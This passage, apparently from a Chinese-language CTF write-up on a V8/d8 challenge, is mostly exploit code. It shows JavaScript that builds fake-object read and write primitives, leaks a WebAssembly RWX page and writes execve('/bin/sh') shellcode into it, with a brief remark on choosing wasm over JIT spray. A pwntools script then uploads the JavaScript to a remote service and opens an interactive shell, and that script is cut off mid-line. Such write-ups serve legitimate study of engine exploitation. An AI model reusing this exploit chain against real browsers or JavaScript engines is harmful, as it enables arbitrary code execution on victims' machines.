style="color:#666666">;</span><br><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">fake_arr_elements_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> fake_arr_elements_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> fake_obj</span><span style="color:#666666"> =</span><span style="color:#80A665"> fakeobj</span><span style="color:#d4976c">(</span><span style="color:#BD976A">fake_arr_elements_addr</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><br><br><span style="color:#CB7676">	function</span><span style="color:#80A665"> write64</span><span style="color:#d4976c">(</span><span style="color:#BD976A">where</span><span style="color:#666666">,</span><span style="color:#BD976A"> what</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">		fake_obj</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#4C9A91">6</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#BD976A">where</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">		arbrw_arr</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> what</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><span style="color:#758575DD">	//</span><br><span style="color:#CB7676">	function</span><span style="color:#80A665"> read64</span><span style="color:#d4976c">(</span><span style="color:#BD976A">where</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">		fake_obj</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#4C9A91">6</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#BD976A">where</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">		return</span><span style="color:#BD976A"> arbrw_arr</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666">.</span><span style="color:#80A665">f2i</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><br><span style="color:#CB7676">    var</span><span style="color:#BD976A"> wasmCode</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Uint8Array</span><span style="color:#d4976c">(</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">97</span><span style="color:#666666">,</span><span style="color:#4C9A91">115</span><span style="color:#666666">,</span><span style="color:#4C9A91">109</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">133</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">96</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">127</span><span style="color:#666666">,</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91">130</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#4C9A91">132</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">112</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">5</span><span style="color:#666666">,</span><span style="color:#4C9A91">131</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">6</span><span style="color:#666666">,</span><span style="color:#4C9A91">129</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">7</span><span style="color:#666666">,</span><span style="color:#4C9A91">145</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#4C9A91">6</span><span style="color:#666666">,</span><span style="color:#4C9A91">109</span><span style="color:#666666">,</span><span style="color:#4C9A91">101</span><span style="color:#666666">,</span><span style="color:#4C9A91">109</span><span style="color:#666666">,</span><span style="color:#4C9A91">111</span><span style="color:#666666">,</span><span style="color:#4C9A91">114</span><span style="color:#666666">,</span><span style="color:#4C9A91">121</span><span style="color:#666666">,</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#4C9A91">109</span><span style="color:#666666">,</span><span style="color:#4C9A91">97</span><span style="color:#666666">,</span><span style="color:#4C9A91">105</span><span style="color:#666666">,</span><span style="color:#4C9A91">110</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">10</span><span style="color:#666666">,</span><span style="color:#4C9A91">138</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91">132</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91">65</span><span style="color:#666666">,</span><span style="color:#4C9A91">42</span><span style="color:#666666">,</span><span style="color:#4C9A91">11</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    var</span><span style="color:#BD976A"> wasmModule</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Module</span><span style="color:#d4976c">(</span><span style="color:#BD976A">wasmCode</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    var</span><span style="color:#BD976A"> wasmInstance</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Instance</span><span style="color:#d4976c">(</span><span style="color:#BD976A">wasmModule</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">{</span><span style="color:#d9739f">}</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    var</span><span style="color:#BD976A"> f</span><span style="color:#666666"> =</span><span style="color:#BD976A"> wasmInstance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#BD976A">main</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> instance_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">wasmInstance</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> trusted_data</span><span style="color:#666666"> =</span><span style="color:#80A665"> read64</span><span style="color:#d4976c">(</span><span style="color:#BD976A">instance_addr</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#BD976A">trusted_data</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> rwx</span><span style="color:#666666"> =</span><span style="color:#80A665"> read64</span><span style="color:#d4976c">(</span><span style="color:#BD976A">trusted_data</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0x20</span><span style="color:#CB7676">n</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#BD976A">rwx</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">    var</span><span style="color:#BD976A"> data_buf</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> ArrayBuffer</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">0x400</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    var</span><span style="color:#BD976A"> data_view</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> DataView</span><span style="color:#d4976c">(</span><span style="color:#BD976A">data_buf</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> backing</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">data_buf</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x18</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x4</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> haddr</span><span style="color:#666666"> =</span><span style="color:#80A665"> read64</span><span style="color:#d4976c">(</span><span style="color:#BD976A">backing</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#BD976A">backing</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#BD976A">haddr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">	// %SystemBreak();</span><br><br><span style="color:#80A665">	write64</span><span style="color:#d4976c">(</span><span style="color:#BD976A">backing</span><span style="color:#666666">,</span><span style="color:#BD976A"> rwx</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> shellcode</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><br><span style="color:#4C9A91">      0x2fbb485299583b6a</span><span style="color:#CB7676">n</span><span style="color:#666666">,</span><br><span style="color:#4C9A91">      0x5368732f6e69622f</span><span style="color:#CB7676">n</span><span style="color:#666666">,</span><br><span style="color:#4C9A91">      0x050f5e5457525f54</span><span style="color:#CB7676">n</span><br><span style="color:#666666">        </span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    for</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#BD976A"> shellcode</span><span style="color:#666666">.</span><span style="color:#B8A965">length</span><span style="color:#666666">;</span><span style="color:#CB7676"> ++</span><span style="color:#BD976A">i</span><span style="color:#d4976c">)</span><br><span style="color:#666666">    </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">		data_view</span><span style="color:#666666">.</span><span style="color:#80A665">setFloat64</span><span style="color:#d9739f">(</span><span style="color:#BD976A">i</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><span style="color:#BD976A"> shellcode</span><span style="color:#e6cc77">[</span><span style="color:#BD976A">i</span><span style="color:#e6cc77">]</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#666666">,</span><span style="color:#4D9375"> true</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#d4976c">}</span><br><span style="color:#758575DD">	// %SystemBreak();</span><br><br><span style="color:#80A665">    f</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4d9375">}</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>本来是想打 jit spray，但是似乎高版本里 <code class="inline-code">func->code</code> 在另一个 isolate 里，所以就打 wasm 了，远程没开 pkey protect.</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> argparse</span><span style="color:#999999">,</span><span style="color:#393A34"> sys</span><span style="color:#999999">,</span><span style="color:#393A34"> os</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    ap </span><span style="color:#999999">=</span><span style="color:#393A34"> argparse</span><span style="color:#999999">.</span><span style="color:#393A34">ArgumentParser</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ap</span><span style="color:#999999">.</span><span style="color:#393A34">add_argument</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">host</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ap</span><span style="color:#999999">.</span><span style="color:#393A34">add_argument</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">port</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> type</span><span style="color:#999999">=</span><span style="color:#998418">int</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ap</span><span style="color:#999999">.</span><span style="color:#393A34">add_argument</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">js</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ap</span><span style="color:#999999">.</span><span style="color:#393A34">add_argument</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">--timeout</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> type</span><span style="color:#999999">=</span><span style="color:#998418">float</span><span style="color:#999999">,</span><span style="color:#B07D48"> default</span><span style="color:#999999">=</span><span style="color:#2F798A">40.0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ap</span><span style="color:#999999">.</span><span style="color:#393A34">add_argument</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">--debug</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> action</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">store_true</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    args </span><span style="color:#999999">=</span><span style="color:#393A34"> ap</span><span style="color:#999999">.</span><span style="color:#393A34">parse_args</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">debug</span><span style="color:#999999">:</span><br><span style="color:#393A34">        context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><br><span style="color:#A0ADA0">    # 以 UTF-8 文本读取，长度按“字符数”计算，匹配远端 start_d8.py 的 sys.stdin.read(size)</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        script_str </span><span style="color:#999999">=</span><span style="color:#998418"> open</span><span style="color:#2993a3">(</span><span style="color:#393A34">args</span><span style="color:#999999">.</span><span style="color:#393A34">js</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">r</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> encoding</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">utf-8</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> e</span><span style="color:#999999">:</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"read js failed: </span><span style="color:#1e754f">{</span><span style="color:#393A34">e</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        sys</span><span style="color:#999999">.</span><span style="color:#393A34">exit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    size_chars </span><span style="color:#999999">=</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">script_str</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> size_chars </span><span style="color:#AB5959">></span><span style="color:#AB5959">=</span><span style="color:#2F798A"> 20000</span><span style="color:#999999">:</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"payload too large (chars): </span><span style="color:#1e754f">{</span><span style="color:#393A34">size_chars</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        sys</span><span style="color:#999999">.</span><span style="color:#393A34">exit</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    script_bytes </span><span style="color:#999999">=</span><span style="color:#393A34"> script_str</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">utf-8</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#393A34">args</span><span style="color:#999999">.</span><span style="color:#393A34">host</span><span style="color:#999999">,</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">port</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#393A34">args</span><span style="color:#999999">.</span><span style="color:#393A34">timeout</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">    # 握手：等待提示，发送长度（字符数）</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter solve script file size:</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">size_chars</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">    # 等待上传提示，发送脚本正文（UTF-8 字节）</span><br><span style="color:#A0ADA0">    # io.recvuntil(b"Waiting for script content...")</span><br><span style="color:#393A34">    pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">script_bytes</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#998418"> __name__</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">__main__</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">    main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argparse</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sys</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> os</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    ap </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> argparse</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ArgumentParser</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ap</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add_argument</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">host</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ap</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add_argument</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">port</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> type</span><span style="color:#666666">=</span><span style="color:#B8A965">int</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ap</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add_argument</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">js</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ap</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add_argument</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">--timeout</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> type</span><span style="color:#666666">=</span><span style="color:#B8A965">float</span><span style="color:#666666">,</span><span style="color:#BD976A"> default</span><span style="color:#666666">=</span><span style="color:#4C9A91">40.0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ap</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add_argument</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">--debug</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> action</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">store_true</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    args </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ap</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_args</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">debug</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#758575DD">    # 以 UTF-8 文本读取，长度按“字符数”计算，匹配远端 start_d8.py 的 sys.stdin.read(size)</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        script_str </span><span style="color:#666666">=</span><span style="color:#B8A965"> open</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">js</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> encoding</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> e</span><span style="color:#666666">:</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"read js failed: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">e</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">exit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    size_chars </span><span style="color:#666666">=</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span 